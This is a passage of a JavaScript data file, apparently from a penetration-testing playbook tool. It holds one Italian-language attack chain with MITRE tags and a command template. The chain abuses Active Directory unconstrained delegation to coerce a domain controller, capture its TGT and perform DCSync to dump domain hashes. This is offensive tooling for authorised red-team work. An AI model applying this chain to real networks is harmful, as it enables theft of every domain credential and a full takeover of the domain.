    "difficulty": "hard",
    "estTime": "15 min",
    "objective": "Con SYSTEM su una macchina con unconstrained delegation forzi il DC ad autenticarsi verso di te, ne catturi il TGT e con quello fai `DCSync`.",
    "outcome": "Hash del dominio (`DCSync`)",
    "prereqs": [
      "SYSTEM su una macchina con unconstrained delegation",
      "Il DC deve poterti raggiungere (coercion)"
    ],
    "mitre": [
      "T1187",
      "T1558",
      "T1003.006"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Conferma la delega non vincolata",
        "cmd": {
          "name": "Find unconstrained delegation",
          "description": "Verifica quali computer hanno il flag TRUSTED_FOR_DELEGATION. Il vettore è percorribile solo se hai (o ottieni) SYSTEM su uno di questi, perché è lì che finiranno i TGT catturati.",
          "template": "nxc ldap <ip> -u '<user>' -p '<password>' --find-delegation\n# oppure da Windows (PowerView):\nGet-DomainComputer -Unconstrained | select dnshostname",
          "params": [
            {
              "key": "ip",
              "label": "DC IP",
              "ctx": "ip",
              "placeholder": "10.10.10.11"
            },
            {
              "key": "user",
              "label": "User",
              "ctx": "user",
              "placeholder": "jdoe"
            },
            {
              "key": "password",
              "label": "Password",
              "ctx": "password",
              "placeholder": "P@ssw0rd"
            }
          ]
        },
        "verify": "Un computer compare con delega `Unconstrained`. Se è quello su cui controlli SYSTEM, si può procedere alla cattura dei TGT."
      },
      {
        "id": "s2",
        "verify": "Il monitor resta in ascolto e stampa i TGT via via che finiscono nella cache della macchina con delega non vincolata.",
        "title": "Monitora i TGT in arrivo",
        "cmdRef": "unconstrained-deleg"
      },
      {
        "id": "s3",
        "verify": "`Authenticating against … SUCCEED` e sul monitor compare il TGT del computer account del domain controller.",
        "title": "Forza il DC ad autenticarsi",
        "cmdRef": "coercer"
      },
      {
        "id": "s4",
        "verify": "Con il TGT del DC iniettato in `KRB5CCNAME`, il dump degli hash di dominio va a buon fine partendo da `Administrator:500:`.",
        "title": "Inietta il TGT del DC$ e fai `DCSync`",
        "cmdRef": "dcsync"
      }
    ]
  }
];
window.CHAINS = CHAINS;
